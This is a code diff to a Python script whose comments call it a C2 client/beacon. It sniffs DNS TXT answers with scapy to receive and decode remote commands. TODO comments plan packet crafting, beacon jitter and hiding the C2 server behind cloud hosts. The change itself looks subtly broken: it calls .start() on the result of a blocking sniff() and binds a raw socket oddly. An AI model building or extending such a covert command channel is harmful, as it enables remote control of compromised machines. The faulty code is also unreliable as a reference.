@@ -3,12 +3,13 @@
 # TODO Later: implement DNS packet transfering with scapy, packet crafting
 # TODO Later: implement some jitter for client/beacon traffic sleeping assuming we have a sendback MAYBE
 # Look into platform as a service things (for the waaay future) for getting rnadom domains it would point to a cloud machine (university envir could be on the cloud) with firewall rules then the c2 server is behind the cloud machine
-from scapy.all import AsyncSniffer, Packet
+from scapy.all import AsyncSniffer, Packet, sniff
 from scapy.layers.dns import DNS
 import subprocess
 import os
 import re
 import argparse
+import socket
 from time import sleep
 
 key = "ringring"
@@ -30,11 +31,11 @@ def sniffHandle(packet: Packet) -> None:
     """Gets called every time a packet from the sniffer is sent, as of right now it prints the payload of the packet"""
     try:
         # DNS.qr.qtype: 16 the txt record
-        if packet.haslayer(DNS) and packet.getlayer(DNS).an[0].type == 16:
+        if packet.haslayer(DNS) and packet.getlayer(DNS).an[1].type == 16:
             # packet[3] is the raw layer that contains that data passed into the ping command
             # should we need the query name it is here: dns.qd.qname.decode("utf-8")
             dns = packet.getlayer(DNS)
-            decodedCommand = dns.an[0].rdata[0].decode("utf-8")
+            decodedCommand = dns.an[1].rdata[0].decode("utf-8")
             print(decodedCommand)
 
             # # checks if the user passed in the cd command
@@ -58,7 +59,9 @@ def sniffHandle(packet: Packet) -> None:
 
 def sniffer() -> None:
     """Starts an asynchronus sniffer then allows for the program to be interrupted"""
-    sniffer = AsyncSniffer(filter="udp port 53", prn=sniffHandle)
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
+    s.bind((socket.gethostname(), 53))
+    sniffer = sniff(filter="udp port 53", prn=sniffHandle, sock=s)
 
     print("[*] Start sniffing...")
     sniffer.start()
